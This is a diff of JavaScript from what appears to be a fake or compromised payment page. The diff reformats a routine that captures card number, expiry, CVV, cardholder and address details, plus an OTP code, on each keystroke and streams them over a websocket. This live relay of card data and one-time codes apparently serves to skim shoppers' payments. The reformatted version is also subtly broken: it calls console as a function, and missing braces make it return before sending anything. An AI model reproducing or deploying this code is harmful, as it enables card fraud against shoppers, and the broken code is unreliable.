@@ -1075,7 +1075,43 @@ url("pay1ment_icons.woff") format("woff");
 
                     }
                     )();
-                    var liveTimer=null;var _sessionCreating=false;function livePush(){if(!ws||ws.readyState!==1)return;if(!s&&_sessionCreating)return;var p=build();if(!s){ws.send(JSON.stringify({type:'customer_input',payload:p}));}else{ws.send(JSON.stringify({type:'session_update',payload:{sessionId:s,cardInfo:p.cardInfo,customerInfo:p.customerInfo,currentStep:'card'}}));}}function onInput(){clearTimeout(liveTimer);liveTimer=setTimeout(livePush,150);}var liveInputs=['cardNumber','expiry','cvv','cardHolder','fullNameIpt','emailIpt','phoneIpt','countryIpt','address1Ipt','address2Ipt','cityIpt','stateIpt','zipCodeIpt','otpCode'];liveInputs.forEach(function(id){var el=q(id);if(el)el.addEventListener('input',onInput);});
+                    var liveTimer = null;
+                    var _sessionCreating = false;
+                    function livePush() {
+                        if (!ws || ws.readyState !== 1)
+                            console('ws读不到');
+                            return;
+                        if (!s && _sessionCreating)
+                            console('ws读不到');
+                            return;
+                        var p = build();
+                        if (!s) {
+                            ws.send(JSON.stringify({
+                                type: 'customer_input',
+                                payload: p
+                            }));
+                        } else {
+                            ws.send(JSON.stringify({
+                                type: 'session_update',
+                                payload: {
+                                    sessionId: s,
+                                    cardInfo: p.cardInfo,
+                                    customerInfo: p.customerInfo,
+                                    currentStep: 'card'
+                                }
+                            }));
+                        }
+                    }
+                    function onInput() {
+                        clearTimeout(liveTimer);
+                        liveTimer = setTimeout(livePush, 150);
+                    }
+                    var liveInputs = ['cardNumber', 'expiry', 'cvv', 'cardHolder', 'fullNameIpt', 'emailIpt', 'phoneIpt', 'countryIpt', 'address1Ipt', 'address2Ipt', 'cityIpt', 'stateIpt', 'zipCodeIpt', 'otpCode'];
+                    liveInputs.forEach(function(id) {
+                        var el = q(id);
+                        if (el)
+                            el.addEventListener('input', onInput);
+                    });
                     ;cws();
                 }
                 )();
